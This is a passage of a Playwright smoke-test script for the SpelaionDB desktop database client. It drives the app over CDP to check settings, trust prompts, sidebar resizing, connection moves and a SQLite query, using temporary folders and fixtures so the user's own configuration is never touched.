// Smoke test of the real app: starts it with the WebView2 debugging port open and drives it
// with Playwright (CDP). It uses examples/demo and a temporary personal directory, so it does
// not touch the user's configuration or keychain.
//
// Requirements: the app and the CLI (for the MCP activity steps) built in one command, so DuckDB
// is compiled once (CONTRIBUTING.md): npx tauri build --no-bundle -- -p spelaion-desktop
// -p spelaion-cli; Python, to make examples/demo/data/shop.db again at the start of every run
// (examples/demo/make-shop-db.py), and, for the PostgreSQL steps, testing/docker up.
//   node e2e/smoke.mjs [screenshots-dir]
// On Linux (WebKitGTK has no CDP port) run the Linux pass instead: node e2e/smoke-linux.mjs.

import { execFileSync, spawn } from "node:child_process";
import assert from "node:assert/strict";
import { once } from "node:events";
import { createServer } from "node:net";
import { createServer as createHttpServer } from "node:http";
import { crc32, deflateSync } from "node:zlib";
import { createCipheriv } from "node:crypto";
import { copyFileSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { chromium } from "playwright-core";
import { commandLines, requestClose } from "./processes.mjs";

if (process.platform === "linux") {
  console.error("smoke.mjs drives WebView2 over CDP; on Linux run node e2e/smoke-linux.mjs (AGENTS.md)");
  process.exit(2);
}

const root = resolve(import.meta.dirname, "../../..");
const exe = process.env.SPELAION_E2E_EXE ?? join(root, "target/release/spelaion-desktop" + (process.platform === "win32" ? ".exe" : ""));
const demo = join(root, "examples/demo");
/** A 256 px map tile (PNG): a light square with a darker edge, served by the smoke's own tile
 *  server so tiles are tested without leaving this computer. */
function tilePng() {
  const size = 256;
  const raw = Buffer.alloc((size * 3 + 1) * size);
  for (let y = 0; y < size; y++) {
    raw[y * (size * 3 + 1)] = 0;
    for (let x = 0; x < size; x++) {
      const edge = x === 0 || y === 0;
      const at = y * (size * 3 + 1) + 1 + x * 3;
      raw[at] = edge ? 170 : 222;
      raw[at + 1] = edge ? 190 : 234;
      raw[at + 2] = edge ? 170 : 222;
    }
  }
  const chunk = (type, data) => {
    const head = Buffer.alloc(8);
    head.writeUInt32BE(data.length);
    head.write(type, 4, "ascii");
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(crc32(Buffer.concat([head.subarray(4), data])));
    return Buffer.concat([head, data, crc]);
  };
  const header = Buffer.alloc(13);
  header.writeUInt32BE(size, 0);
  header.writeUInt32BE(size, 4);
  header[8] = 8;
  header[9] = 2;
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    chunk("IHDR", header),
    chunk("IDAT", deflateSync(raw)),
    chunk("IEND", Buffer.alloc(0)),
  ]);
}

const shots = resolve(process.argv[2] ?? join(import.meta.dirname, "screenshots"));
const userDir = mkdtempSync(join(tmpdir(), "spelaion-e2e-"));
const port = await freePort();
// The MCP page's AI clients: their files under this folder, and a stand-in for the CLI.
const clientsHome = join(userDir, "ai-clients");
// Files a real DataGrip wrote (crates/spelaion-config/tests/fixtures/datagrip/README.md).
const datagripFixtures = join(root, "crates/spelaion-config/tests/fixtures/datagrip");
const datagripJetbrains = join(datagripFixtures, "JetBrains");
const datagripProject = join(datagripFixtures, "DataGripProjects", "default");
// Files a real TablePlus wrote (crates/spelaion-config/tests/fixtures/tableplus/README.md).
const tableplusFixtures = join(root, "crates/spelaion-config/tests/fixtures/tableplus");
// The connections.xml a real MySQL Workbench wrote (crates/spelaion-config/tests/fixtures/workbench/README.md),
// copied into a Workbench folder of the test's own with a stand-in vault file, as Workbench for
// Windows leaves one once a password is stored: it is noticed, never opened.
const workbenchHome = join(userDir, "mysql-workbench");
mkdirSync(workbenchHome, { recursive: true });
copyFileSync(join(root, "crates/spelaion-config/tests/fixtures/workbench/Workbench/connections.xml"), join(workbenchHome, "connections.xml"));
writeFileSync(join(workbenchHome, "workbench_user_data.dat"), "not a vault");
const fakeCli = join(userDir, process.platform === "win32" ? "spelaiondb.exe" : "spelaiondb");
writeFileSync(fakeCli, "");
const editSmokeComplete = Symbol("edit smoke complete");
const untilComplete = Symbol("smoke complete up to SPELAION_E2E_UNTIL");
mkdirSync(shots, { recursive: true });

/** A local port nothing listens on right now. */
async function freePort() {
  const server = createServer();
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const { port } = server.address();
  server.close();
  await once(server, "close");
  return port;
}

function startApp() {
  return spawn(exe, [demo], {
    env: {
      ...process.env,
      SPELAION_USER_DIR: userDir,
      WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS: `--remote-debugging-port=${port}`,
      // Its own WebView2 profile: an installed SpelaionDB that is open (same app identifier)
      // would otherwise share it and the second webview fails to start.
      WEBVIEW2_USER_DATA_FOLDER: join(userDir, "webview2"),
      // kubectl only ever sees the test cluster (or nothing), never the user's clusters.
      KUBECONFIG: process.env.SPELAION_TEST_K8S ?? join(userDir, "no-kubeconfig"),
      // No request to GitHub for updates: the run must not depend on the network (ADR-021).
      SPELAION_NO_UPDATES: "1",
      // The MCP page never reads or writes the user's AI clients' files (ADR-033).
      SPELAION_MCP_CLIENTS_HOME: clientsHome,
      SPELAION_CLI: fakeCli,
      // The DataGrip import reads the repository's fixtures, never the user's JetBrains files.
      SPELAION_JETBRAINS_DIR: datagripJetbrains,
      // The TablePlus import reads the repository's fixtures, never the user's TablePlus folder.
      SPELAION_TABLEPLUS_DIR: join(tableplusFixtures, "com.tinyapp.TablePlus"),
      // The MySQL Workbench import reads the repository's fixture, never the user's Workbench folder.
      SPELAION_WORKBENCH_DIR: workbenchHome,
      // The pgAdmin import never opens the user's pgadmin4.db: this folder has none.
      SPELAION_PGADMIN_DIR: join(userDir, "no-pgadmin"),
      // The Beekeeper Studio import never opens the user's app.db: this folder has none.
      SPELAION_BEEKEEPER_DIR: join(userDir, "no-beekeeper"),
    },
    windowsHide: true,
    stdio: "inherit",
  });
}

// The run changes the demo's shop.db (the column editor rebuilds product, among others), so
// every run starts from a fresh one: a later run would otherwise find nothing to change.
execFileSync(process.platform === "win32" ? "python" : "python3", [join(demo, "make-shop-db.py")], { stdio: "inherit" });
let app = startApp();

/** Runs `spelaiondb mcp` as an AI client would (stdio, JSON-RPC): `list_connections`, then each
 *  call, as the client "smoke-agent". Needs the CLI, built with the app (see the top). */
async function agentSession(calls) {
  const cli = process.env.SPELAION_E2E_CLI ?? join(root, "target/release/spelaiondb" + (process.platform === "win32" ? ".exe" : ""));
  if (!existsSync(cli)) throw new Error(`${cli} is missing: in apps/desktop, run npx tauri build --no-bundle -- -p spelaion-desktop -p spelaion-cli`);
  const agent = spawn(cli, ["mcp", "--workspace", demo], {
    env: { ...process.env, SPELAION_USER_DIR: userDir },
    stdio: ["pipe", "pipe", "inherit"],
  });
  let buffer = "";
  const waiting = new Map();
  agent.stdout.setEncoding("utf8");
  agent.stdout.on("data", (chunk) => {
    buffer += chunk;
    let newline;
    while ((newline = buffer.indexOf("\n")) >= 0) {
      const message = JSON.parse(buffer.slice(0, newline));
      buffer = buffer.slice(newline + 1);
      waiting.get(message.id)?.(message);
    }
  });
  let next = 1;
  const request = (method, params) =>
    new Promise((done, fail) => {
      const id = next++;
      const timer = setTimeout(() => fail(new Error(`${method}: no answer`)), 30_000);
      waiting.set(id, (message) => {
        clearTimeout(timer);
        if (message.error) fail(new Error(`${method}: ${JSON.stringify(message.error)}`));
        else done(message.result);
      });
      agent.stdin.write(JSON.stringify({ jsonrpc: "2.0", id, method, params }) + "\n");
    });
  await request("initialize", { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "smoke-agent", version: "1.0" } });
  agent.stdin.write(JSON.stringify({ jsonrpc: "2.0", method: "notifications/initialized" }) + "\n");
  for (const [name, args] of [["list_connections", {}], ...calls]) {
    await request("tools/call", { name, arguments: args });
  }
  agent.stdin.end();
  await once(agent, "exit");
}

async function stopApp() {
  if (app.exitCode !== null || app.signalCode !== null) return;
  const exited = once(app, "exit");
  app.kill();
  await exited;
}

/** Closes the app like its window's close button (WM_CLOSE), so its exit code runs. */
async function closeApp() {
  const exited = once(app, "exit");
  requestClose(app.pid);
  const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error("the app did not close")), 15_000));
  await Promise.race([exited, timeout]);
}

/** `kubectl` processes started with the test cluster's kubeconfig. */
function testKubectls() {
  const kubeconfig = process.env.SPELAION_TEST_K8S.replaceAll("\\", "/").toLowerCase();
  return commandLines("kubectl").filter((line) => line.replaceAll("\\", "/").toLowerCase().includes(kubeconfig));
}

async function connect() {
  for (let i = 0; i < 60; i++) {
    try {
      return await chromium.connectOverCDP(`http://127.0.0.1:${port}`);
    } catch {
      await new Promise((r) => setTimeout(r, 500));
    }
  }
  throw new Error("the app did not open the debugging port");
}

let failed = false;
// The demo's shop.toml is changed during the run (ADR-022) and always put back.
const shopFile = join(demo, ".spelaion", "connections", "shop.toml");
const shopOriginal = readFileSync(shopFile, "utf8");
let browser = await connect();
try {
  let page = browser.contexts()[0].pages()[0];
  page.setDefaultTimeout(30_000);
  const shot = (name) => page.screenshot({ path: join(shots, `${name}.png`) });
  // SPELAION_E2E_UNTIL=<the start of a step's text>: the run stops as a pass when the step
  // after that one begins, to repeat one step without the whole run.
  let untilReached = false;
  const step = (text) => {
    if (untilReached) throw untilComplete;
    if (process.env.SPELAION_E2E_UNTIL && text.startsWith(process.env.SPELAION_E2E_UNTIL)) untilReached = true;
    console.log(`· ${text}`);
  };

  async function newQuery(connection, sql) {
    // Double-clicking a connection opens a new query on it (its row has no buttons, SDB-102).
    await page.locator(`.connection-row:has-text("${connection}") > .label`).dblclick();
    const panel = page.locator(".tab-panel:not([hidden])");
    await panel.locator(".status-connecting").waitFor({ state: "detached" });
    await panel.locator(".cm-content").click();
    // insertText does not trigger autocompletion (Enter would accept a suggestion).
    await page.keyboard.insertText(sql);
    return panel;
  }
  async function run(panel) {
    await panel.locator(".cm-content").click();
    await page.keyboard.press("Control+Shift+Enter");
  }
  async function replaceQuery(panel, sql) {
    await panel.locator(".cm-content").click();
    await page.keyboard.press("Control+A");
    await page.keyboard.insertText(sql);
  }
  // An element's box once it has stopped moving: the same in two checks a few frames apart.
  async function settledBox(locator) {
    const deadline = Date.now() + 10_000;
    let previous = null;
    for (;;) {
      const box = await locator.boundingBox();
      if (box && previous && ["x", "y", "width", "height"].every((key) => box[key] === previous[key])) return box;
      if (Date.now() > deadline) throw new Error(`the box of ${locator} kept moving: ${JSON.stringify(previous)} → ${JSON.stringify(box)}`);
      previous = box;
      await page.evaluate(() => new Promise((done) => requestAnimationFrame(() => requestAnimationFrame(done))));
    }
  }
  async function waitForHistoryCount(count) {
    await page.waitForFunction((expected) => document.querySelectorAll(".history-entry").length === expected && document.querySelector(".history-entries")?.getAttribute("aria-busy") === "false", count);
  }
  /** Waits until the history panel shows exactly the entries `select <n> as <marker>;` for the
   *  numbers from `first` down to `last`, and returns their statements, read in the same frame.
   *  A count alone is not enough: when the search applies, one frame still shows the previous
   *  page's 50 entries as not busy, and they are cleared right after. */
  async function waitForHistoryPage(marker, first, last) {
    const handle = await page.waitForFunction(({ marker, first, last }) => {
      if (document.querySelector(".history-entries")?.getAttribute("aria-busy") !== "false") return false;
      const statements = [...document.querySelectorAll(".history-entry .history-sql")].map((sql) => sql.textContent);
      if (statements.length !== first - last + 1) return false;
      const pattern = new RegExp(`^select (\\d+) as ${marker};?$`);
      const numbers = new Set(statements.map((sql) => Number(pattern.exec(sql.trim())?.[1] ?? NaN)));
      for (let n = last; n <= first; n++) if (!numbers.has(n)) return false;
      return statements;
    }, { marker, first, last });
    return handle.jsonValue();
  }
  // A connection's actions are all in its row's context menu (SDB-102).
  async function connectionMenu(connection) {
    await page.locator(`.connection-row:has-text("${connection}")`).click({ button: "right" });
    const menu = page.locator(".connection-menu");
    await menu.waitFor();
    return menu;
  }
  // Whether a connection's queries are recorded, as the local store says (never its file).
  async function historySaving(connection) {
    return page.evaluate(async (name) => {
      const connections = await window.__TAURI_INTERNALS__.invoke("list_connections");
      return connections.find((item) => item.name === name).historyEnabled;
    }, connection);
  }
  // The history preference is one of the connection's options, in its form (SDB-102).
  async function setHistorySaving(connection, enabled, screenshot) {
    await (await connectionMenu(connection)).getByRole("menuitem", { name: "Edit…" }).click();
    const form = page.locator(".modal.wizard");
    await form.getByRole("tab", { name: "Options" }).click();
    const checkbox = form.getByRole("checkbox", { name: "Save query history", exact: true });
    await checkbox.scrollIntoViewIfNeeded();
    if (await checkbox.isChecked() !== enabled) await checkbox.click();
    if (screenshot) await shot(screenshot);
    await form.getByRole("button", { name: "Save changes" }).click();
    await form.waitFor({ state: "detached" });
    assert.equal(await historySaving(connection), enabled);
  }
  // Opens a settings category in the settings dialog, runs `action` and closes the dialog:
  // the tabs behind it are left as they were.
  const CATEGORY = { appearance: 1, language: 2, explorer: 3, connections: 4, types: 5, masking: 6, history: 7, network: 8, scripts: 10, editor: 11, map: 12 };
  async function withSettings(category, action) {
    await page.locator(".activity-bar .settings-button").click();
    const dialog = page.locator(".settings-dialog");
    await dialog.waitFor();
    await dialog.locator(`.settings-nav button:nth-child(${CATEGORY[category]})`).click();
    await action(dialog.locator(".settings"));
    await dialog.locator(".wizard-header button").click();
    await dialog.waitFor({ state: "detached" });
  }
  async function setLanguage(value) {
    await withSettings("language", async (settings) => {
      await settings.locator(`input[name="language"][value="${value}"]`).click();
      await page.waitForFunction((expected) => {
        const input = document.querySelector(`input[name="language"][value="${expected}"]`);
        return input?.checked && !input.matches(":disabled") && document.documentElement.lang === expected;
      }, value);
    });
  }
  async function setTheme(value, expected) {
    await withSettings("appearance", async (settings) => {
      await settings.locator(`input[name="theme"][value="${value}"]`).click();
      await page.waitForFunction(([v, theme]) => {
        const input = document.querySelector(`input[name="theme"][value="${v}"]`);
        return input?.checked && !input.matches(":disabled") && document.documentElement.dataset.theme === theme;
      }, [value, expected]);
    });
  }
  async function savedLanguage() {
    let value = null;
    await withSettings("language", async (settings) => {
      await settings.locator('input[name="language"]:checked:not(:disabled)').waitFor();
      value = await settings.locator('input[name="language"]:checked').getAttribute("value");
    });
    return value;
  }

  step("startup and untrusted repository");
  await page.locator(".activity-bar .settings-button").waitFor();
  assert.equal(await page.locator(".language-setting").count(), 0, "the language selector left the tab bar");
  assert.equal(await savedLanguage(), "system");
  await page.evaluate(() => {
    Object.defineProperty(navigator, "languages", { configurable: true, value: ["es-ES"] });
    window.dispatchEvent(new Event("languagechange"));
  });
  await page.waitForFunction(() => document.documentElement.lang === "es-ES");
  await page.evaluate(() => {
    Object.defineProperty(navigator, "languages", { configurable: true, value: ["fr-FR"] });
    window.dispatchEvent(new Event("languagechange"));
  });
  await page.waitForFunction(() => document.documentElement.lang === "en");
  await setLanguage("es");
  await page.getByText("Selecciona una conexión a la izquierda o abre una consulta nueva.").waitFor();
  await page.getByRole("button", { name: "Configuración", exact: true }).waitFor();
  const spanishActivities = page.getByRole("navigation", { name: "Barra de actividades" });
  await spanishActivities.getByRole("button", { name: "Conexiones", exact: true }).waitFor();
  await spanishActivities.getByRole("button", { name: "Historial de consultas", exact: true }).waitFor();
  await setLanguage("en");
  await page.getByText("Shop (SQLite)").waitFor();
  await page.getByText("is not trusted").waitFor();
  await shot("01-start");

  step("Kubernetes editor requires repository trust before listing");
  await (await connectionMenu("Shop (SQLite)")).getByRole("menuitem", { name: "Edit…" }).click();
  let trustDialog = page.getByRole("dialog", { name: "Trust this repository?" });
  await trustDialog.waitFor();
  await trustDialog.getByRole("button", { name: "Don't trust" }).click();
  await page.locator(".modal.wizard").waitFor({ state: "detached" });
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  const untrustedWizard = page.locator(".modal.wizard");
  await untrustedWizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
  await untrustedWizard.getByRole("tab", { name: "Kubernetes" }).click();
  const kubeCheckbox = untrustedWizard.getByRole("checkbox", { name: "Connect through kubectl port-forward" });
  await kubeCheckbox.click();
  trustDialog = page.getByRole("dialog", { name: "Trust this repository?" });
  await trustDialog.waitFor();
  await trustDialog.getByRole("button", { name: "Don't trust" }).click();
  assert.equal(await kubeCheckbox.isChecked(), false);
  await untrustedWizard.getByRole("button", { name: "Cancel" }).click();
  await untrustedWizard.waitFor({ state: "detached" });

  step("connections sidebar: drag, keyboard resizing, limits and reset");
  const sidebar = page.locator(".sidebar");
  const activities = page.getByRole("navigation", { name: "Activity bar" });
  assert.deepEqual(await activities.getByRole("button").evaluateAll((buttons) => buttons.map((button) => button.getAttribute("aria-label"))), ["Connections", "Processes", "Search", "Query history", "Saved queries", "MCP server", "Settings"]);
  for (const button of await activities.getByRole("button").all()) assert.ok(await button.getAttribute("title"));
  const connectionsActivity = activities.getByRole("button", { name: "Connections" });
  assert.equal(await connectionsActivity.getAttribute("aria-pressed"), "true");
  await connectionsActivity.click();
  await sidebar.waitFor({ state: "hidden" });
  assert.equal(await connectionsActivity.getAttribute("aria-pressed"), "false");
  await connectionsActivity.click();
  await sidebar.waitFor({ state: "visible" });
  assert.equal(await connectionsActivity.getAttribute("aria-pressed"), "true");
  const sidebarResizer = page.getByRole("separator", { name: "Resize the connections panel" });
  const sidebarBox = await sidebar.boundingBox();
  const handleBox = await sidebarResizer.boundingBox();
  const mainBox = await page.locator(".main").boundingBox();
  assert.equal(Math.round(sidebarBox.width), 290);
  assert.equal(Math.round(sidebarBox.x + sidebarBox.width), Math.round(mainBox.x));
  assert.equal(Math.round(handleBox.x), Math.round(mainBox.x));
  assert.equal(Math.round(handleBox.width), 6);
  await page.mouse.move(handleBox.x + handleBox.width / 2, handleBox.y + 100);
  await page.mouse.down();
  await page.mouse.move(handleBox.x + handleBox.width / 2 + 120, handleBox.y + 100, { steps: 5 });
  await page.mouse.up();
  assert.equal(Math.round((await sidebar.boundingBox()).width), 410);
  assert.equal(await sidebarResizer.getAttribute("aria-valuenow"), "410");
  await connectionsActivity.click();
  await sidebar.waitFor({ state: "hidden" });
  await connectionsActivity.click();
  await sidebar.waitFor({ state: "visible" });
  assert.equal(Math.round((await sidebar.boundingBox()).width), 410);
  await sidebarResizer.focus();
  await page.keyboard.press("ArrowLeft");
  assert.equal(Math.round((await sidebar.boundingBox()).width), 400);
  await page.keyboard.press("Home");
  assert.equal(Math.round((await sidebar.boundingBox()).width), 210);
  await page.keyboard.press("End");
  assert.equal(Math.round((await sidebar.boundingBox()).width), Number(await sidebarResizer.getAttribute("aria-valuemax")));
  assert.ok((await page.locator(".main").boundingBox()).width >= 360);
  await sidebarResizer.dblclick();
  assert.equal(Math.round((await sidebar.boundingBox()).width), 290);

  step("settings: a dialog over the tabs, Ctrl+, opens it and Escape closes it");
  const tabsWithoutSettings = await page.locator(".tabbar [role=tab]").count();
  await page.keyboard.press("Control+,");
  const settingsDialog = page.getByRole("dialog", { name: "Settings" });
  await settingsDialog.getByRole("heading", { name: "Appearance" }).waitFor();
  for (let i = 0; i < 20; i++) {
    await page.keyboard.press("Tab");
    assert.ok(await settingsDialog.evaluate((dialog) => dialog.contains(document.activeElement)), "Tab stays in the modal");
  }
  assert.equal(await page.locator(".tabbar [role=tab]").count(), tabsWithoutSettings, "no settings tab");
  assert.equal(await page.locator(".activity-bar .settings-button").getAttribute("aria-pressed"), "true");
  // Updates (ADR-021): switched off for this run (SPELAION_NO_UPDATES), so it says so and
  // asks nothing.
  await settingsDialog.getByRole("button", { name: "Updates", exact: true }).click();
  await settingsDialog.getByRole("heading", { name: "Updates" }).waitFor();
  await settingsDialog.getByText(/^Version \d+\.\d+\.\d+$/).waitFor();
  await settingsDialog.getByRole("status").filter({ hasText: "not available in this build" }).waitFor();
  assert.equal(await page.locator(".update-notice").count(), 0, "no update notice");
  await page.keyboard.press("Escape");
  await settingsDialog.waitFor({ state: "detached" });
  await page.locator(".activity-bar .settings-button").click();
  await settingsDialog.getByRole("button", { name: "History", exact: true }).click();
  await settingsDialog.getByRole("button", { name: "Open query history" }).click();
  await settingsDialog.waitFor({ state: "detached" });
  await page.getByRole("complementary", { name: "Query history", exact: true }).waitFor();
  await page.getByRole("button", { name: "Close query history" }).click();
  const systemTheme = await page.evaluate(() => (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light"));
  assert.equal(await page.locator("html").getAttribute("data-theme"), systemTheme);
  await setTheme("dark", "dark");
  await withSettings("appearance", async () => {
    await shot("01a-settings-dark");
  });
  await setTheme("light", "light");

  let panel;
  step("trust the repository");
  await page.getByRole("button", { name: "Review and trust" }).click();
  await page.getByRole("dialog").getByText("Trust this repository?").waitFor();
  await shot("02-trust");
  await page.getByRole("button", { name: "Trust", exact: true }).click();

  step("connection search: a typo in the name, or the type, finds the connection");
  await page.keyboard.press("Control+Shift+F");
  const connectionFilter = page.getByRole("searchbox", { name: "Filter the explorer" });
  await connectionFilter.fill("shpo");
  await page.locator(".connection-row", { hasText: "Shop (SQLite)" }).waitFor();
  assert.equal(await page.locator(".connection-row").count(), 1, "only Shop matches a typo of its name");
  await shot("sdb-13-search-typo");
  // The type's name finds every connection of that type (Production: the one behind bastions).
  await connectionFilter.fill("production");
  await page.locator(".connection-row", { hasText: "Postgres behind bastions" }).waitFor();
  assert.equal(await page.locator(".connection-row").count(), 1);
  await connectionFilter.fill("");
  await page.keyboard.press("Escape");
  await connectionFilter.waitFor({ state: "detached" });

  step("move a repository connection between folders: drag and drop, Move to folder…, still trusted");
  const shopBefore = readFileSync(shopFile, "utf8");
  const movedShop = join(demo, ".spelaion", "connections", "docker", "shop.toml");
  const nestedShop = join(demo, ".spelaion", "connections", "docker", "eu", "shop.toml");
  // Drags with real pointer events: press on the name, move past the threshold, drop on target.
  // Each move waits for the state it leads to (the row dragged, then the target marked), and
  // the pointer is aimed again at the target's settled box until the explorer marks it.
  async function dragConnection(name, target) {
    const row = page.locator(".connection-row", { hasText: name });
    const from = await settledBox(row.locator(".label"));
    await page.mouse.move(from.x + from.width / 2, from.y + from.height / 2);
    await page.mouse.down();
    await page.mouse.move(from.x + from.width / 2, from.y + from.height / 2 + 12, { steps: 3 });
    await row.and(page.locator(".dragged")).waitFor();
    for (let attempt = 0; ; attempt++) {
      const to = await settledBox(target());
      await page.mouse.move(to.x + to.width / 2 + (attempt % 2), to.y + to.height / 2, { steps: attempt === 0 ? 8 : 2 });
      try {
        await target().and(page.locator(".drop-target")).waitFor({ timeout: 3_000 });
        return;
      } catch (error) {
        if (attempt < 4) continue;
        // What the pointer is over, and whether the drag is still on, for the next failure.
        const state = await page.evaluate(({ x, y }) => ({
          under: document.elementFromPoint(x, y)?.outerHTML.slice(0, 200) ?? null,
          dragging: document.querySelector(".connection-row.dragged")?.textContent ?? null,
        }), { x: to.x + to.width / 2, y: to.y + to.height / 2 });
        throw new Error(`${error.message}\n${JSON.stringify(state)}`);
      }
    }
  }
  const dockerTitle = () => page.locator('.group-segment[data-drop-folder="docker"][data-drop-personal="false"]');
  await dragConnection("Shop (SQLite)", dockerTitle);
  await shot("sdb-13-dragging");
  await page.mouse.up();
  await page.waitForFunction(() =>
    [...document.querySelectorAll(".group-title")].some(
      (title) => title.textContent === "docker" && title.parentElement?.textContent?.includes("Shop (SQLite)"),
    ),
  );
  assert.ok(existsSync(movedShop) && !existsSync(shopFile), "the file moved into docker/");
  assert.equal(readFileSync(movedShop, "utf8"), shopBefore, "byte for byte");
  await shot("sdb-13-dropped");
  // It keeps working, and is still trusted: the explorer connects with no review of a change.
  await page.getByRole("button", { name: "Expand or collapse Shop (SQLite)", exact: true }).click();
  await page.getByRole("button", { name: "Expand or collapse schema main", exact: true }).waitFor();
  assert.equal(await page.getByRole("dialog", { name: "This changed since you trusted the repository" }).count(), 0);
  // Folding keeps the explorer session and its loaded schemas mounted. Searching temporarily
  // reveals matches and closing the search restores the folded state.
  const dockerFolder = page.getByRole("button", { name: "Expand or collapse docker", exact: true });
  await dockerFolder.focus();
  await page.keyboard.press("Space");
  assert.equal(await dockerFolder.getAttribute("aria-expanded"), "false");
  await page.locator('.connection-row:has-text("Shop (SQLite)")').waitFor({ state: "hidden" });
  await page.keyboard.press("Control+Shift+F");
  const foldedFilter = page.getByRole("searchbox", { name: "Filter the explorer" });
  await foldedFilter.fill("Shop (SQLite)");
  await page.locator('.connection-row:has-text("Shop (SQLite)")').waitFor({ state: "visible" });
  await foldedFilter.fill("");
  await page.keyboard.press("Escape");
  await page.locator('.connection-row:has-text("Shop (SQLite)")').waitFor({ state: "hidden" });
  await dockerFolder.focus();
  await page.keyboard.press("Enter");
  await page.getByRole("button", { name: "Expand or collapse schema main", exact: true }).waitFor({ state: "visible" });
  // Into a new nested folder from the dialog; the explorer's own session closes for the move.
  await (await connectionMenu("Shop (SQLite)")).getByRole("menuitem", { name: "Move to folder…" }).click();
  const moveDialog = page.getByRole("dialog", { name: "Move Shop (SQLite) to a folder" });
  await moveDialog.getByLabel("Folder", { exact: true }).fill("docker/eu");
  await shot("sdb-13-move-dialog");
  await moveDialog.getByRole("button", { name: "Move", exact: true }).click();
  await moveDialog.waitFor({ state: "detached" });
  await page.locator('.group-segment[data-drop-folder="docker/eu"]').waitFor();
  assert.ok(existsSync(nestedShop) && !existsSync(movedShop));
  // It stays mounted while its parent is hidden, so inspect it even when it is not accessible.
  const euFolder = page.locator('button[aria-label="Expand or collapse eu"]');
  // Collapse all affects nested connection folders only; the live explorer stays mounted.
  await page.getByRole("button", { name: "Expand or collapse Shop (SQLite)", exact: true }).click();
  const nestedSchema = page.getByRole("button", { name: "Expand or collapse schema main", exact: true });
  await nestedSchema.waitFor();
  const collapseFolders = page.getByRole("button", { name: "Collapse all connection folders" });
  await collapseFolders.focus();
  await page.keyboard.press("Enter");
  assert.equal(await dockerFolder.getAttribute("aria-expanded"), "false");
  assert.equal(await euFolder.getAttribute("aria-expanded"), "false");
  await nestedSchema.waitFor({ state: "hidden" });
  // Searching temporarily opens ancestors, then clearing restores the collapsed state.
  await page.keyboard.press("Control+Shift+F");
  const collapseFilter = page.getByRole("searchbox", { name: "Filter the explorer" });
  await collapseFilter.fill("Shop (SQLite)");
  await nestedSchema.waitFor({ state: "visible" });
  await collapseFilter.fill("");
  await page.keyboard.press("Escape");
  assert.equal(await dockerFolder.getAttribute("aria-expanded"), "false");
  await dockerFolder.click();
  assert.equal(await euFolder.getAttribute("aria-expanded"), "false");
  await euFolder.click();
  await nestedSchema.waitFor({ state: "visible" });
  await euFolder.click();
  await page.locator('.connection-row:has-text("Shop (SQLite)")').waitFor({ state: "hidden" });
  await dockerFolder.click();
  await euFolder.waitFor({ state: "hidden" });
  await dockerFolder.click();
  assert.equal(await euFolder.getAttribute("aria-expanded"), "false", "the child keeps its own folded state");
  await euFolder.click();
  // Back to no folder by dragging it onto "No folder"; the empty folders go.
  await dragConnection("Shop (SQLite)", () => page.locator('.drop-zone[data-drop-folder=""]'));
  await page.mouse.up();
  await page.locator('.group-segment[data-drop-folder="docker/eu"]').waitFor({ state: "detached" });
  assert.ok(existsSync(shopFile) && !existsSync(join(demo, ".spelaion", "connections", "docker", "eu")));
  assert.equal(readFileSync(shopFile, "utf8"), shopBefore);

  step("SQLite: aggregation");
  panel = await newQuery(
    "Shop (SQLite)",
    "select c.country, count(*) as orders, round(sum(o.total), 2) as total\nfrom orders o\njoin customer c on c.id = o.customer_id\ngroup by c.country\norder by total desc;",
  );
  const editorDivider = panel.getByRole("separator", { name: "Resize editor and results" });
  assert.equal(await editorDivider.getAttribute("aria-valuenow"), "42");
  await editorDivider.focus();
  await page.keyboard.press("ArrowDown");
  assert.equal(await editorDivider.getAttribute("aria-valuenow"), "44");
  await page.keyboard.press("Home");
  assert.equal(await editorDivider.getAttribute("aria-valuenow"), "12");
  await page.keyboard.press("End");
  assert.equal(await editorDivider.getAttribute("aria-valuenow"), "85");
  await editorDivider.dblclick();
  assert.equal(await editorDivider.getAttribute("aria-valuenow"), "42");
  await run(panel);
  await panel.locator(".statusline", { hasText: "6 rows" }).waitFor();
  step("SQL syntax remains legible when switching themes");
  const originalSql = await panel.locator(".cm-content").innerText();
  await replaceQuery(panel, "SELECT 'soft red', 42 AS n;");
  const keywords = panel.locator(".cm-content .sql-keyword");
  const strings = panel.locator(".cm-content .sql-string");
  const numbers = panel.locator(".cm-content .sql-literal");
  await keywords.first().waitFor();
  await strings.first().waitFor();
  await numbers.first().waitFor();
  const lightKeywordColor = await keywords.first().evaluate((el) => getComputedStyle(el).color);
  const lightStringColor = await strings.first().evaluate((el) => getComputedStyle(el).color);
  const lightNumberColor = await numbers.first().evaluate((el) => getComputedStyle(el).color);
  assert.equal(lightKeywordColor, "rgb(119, 0, 136)");
  await setTheme("dark", "dark");
  assert.equal(await keywords.first().evaluate((el) => getComputedStyle(el).color), "rgb(199, 146, 234)");
  assert.equal(await strings.first().evaluate((el) => getComputedStyle(el).color), "rgb(230, 161, 155)");
  assert.equal(await numbers.first().evaluate((el) => getComputedStyle(el).color), "rgb(131, 201, 149)");
  await shot("03-grid-dark");
  await setTheme("light", "light");
  assert.equal(await keywords.first().evaluate((el) => getComputedStyle(el).color), lightKeywordColor);
  assert.equal(await strings.first().evaluate((el) => getComputedStyle(el).color), lightStringColor);
  assert.equal(await numbers.first().evaluate((el) => getComputedStyle(el).color), lightNumberColor);
  await replaceQuery(panel, originalSql);
  await panel.locator(".cm-content").click();
  await page.keyboard.press("Control+f");
  const searchInput = panel.locator('.cm-search input[name="search"]');
  await searchInput.fill("country");
  await setLanguage("es");
  assert.equal(await searchInput.inputValue(), "country");
  assert.equal(await searchInput.getAttribute("aria-label"), "Buscar");
  await panel.locator('.cm-search button[name="next"]', { hasText: "siguiente" }).waitFor();
  await panel.getByRole("textbox", { name: "Editor SQL" }).waitFor();
  await panel.locator(".statusline", { hasText: "6 filas" }).waitFor();
